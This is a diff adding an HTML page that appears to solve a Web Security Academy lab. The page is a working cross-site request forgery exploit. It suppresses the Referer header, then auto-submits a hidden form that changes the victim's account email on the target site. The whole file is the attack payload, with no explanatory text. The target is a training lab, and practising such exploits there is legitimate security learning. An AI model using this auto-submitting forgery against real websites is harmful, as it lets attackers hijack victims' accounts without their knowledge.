@@ -1,0 +1,19 @@
+<html>
+<head>
+<meta name="referrer" content="never"> 
+</head>
+<body>
+
+<script>history.pushState('','','/')</script>
+<form action="https://acbf1f181e49e30f808103cd006e0052.web-security-academy.net/email/change-email" method="POST">
+<input type="hidden" name="email" value="kiddie&#64;test&#46;com">
+<input type="submit" value="Submit request">
+</form>
+<script>
+  document.forms[0].submit();
+</script>
+</body>                   
+</html>
+
+
+
